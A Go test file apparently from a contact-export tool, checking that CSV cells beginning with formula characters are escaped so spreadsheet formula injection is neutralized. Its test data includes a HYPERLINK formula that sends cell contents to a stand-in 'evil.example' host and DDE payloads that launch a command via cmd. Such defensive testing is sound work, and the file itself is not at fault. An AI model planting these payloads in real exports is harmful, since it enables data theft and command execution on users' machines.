// SPDX-License-Identifier: AGPL-3.0-or-later

package csv

import (
	"bytes"
	"strings"
	"testing"

	"github.com/emersion/go-vcard"
)

// AUDIT-C: CSV exports must not carry spreadsheet formulas.
func TestSafeCell(t *testing.T) {
	for in, want := range map[string]string{
		`=HYPERLINK("http://evil","x")`: `'=HYPERLINK("http://evil","x")`,
		"@SUM(A1)":                      "'@SUM(A1)",
		"+cmd|' /C calc'!A0":            "'+cmd|' /C calc'!A0",
		"-2+3+cmd|' /C calc'!A0":        "'-2+3+cmd|' /C calc'!A0",
		"\t=1":                          "'\t=1",
		"+49 30 1234-5":                 "+49 30 1234-5",
		"-1":                            "-1",
		"Anna Muster":                   "Anna Muster",
		"":                              "",
	} {
		if got := SafeCell(in); got != want {
			t.Errorf("SafeCell(%q) = %q, want %q", in, got, want)
		}
	}
}

func TestWriteNeutralizesFormulas(t *testing.T) {
	c := vcard.Card{}
	c.SetValue(vcard.FieldVersion, "4.0")
	c.SetValue(vcard.FieldFormattedName, `=HYPERLINK("http://evil.example/?"&A1,"Click")`)
	c.SetValue(vcard.FieldEmail, "a@example.org")
	for _, p := range []string{"outlook", "google"} {
		var buf bytes.Buffer
		preset, ok := PresetByID(p)
		if !ok {
			t.Skipf("no preset %s", p)
		}
		if err := Write(&buf, []vcard.Card{c}, preset); err != nil {
			t.Fatal(err)
		}
		for _, line := range strings.Split(buf.String(), "\n") {
			for _, cell := range strings.Split(line, ",") {
				if strings.HasPrefix(strings.TrimLeft(cell, `"`), "=") {
					t.Fatalf("%s: formula cell %q", p, cell)
				}
			}
		}
	}
}
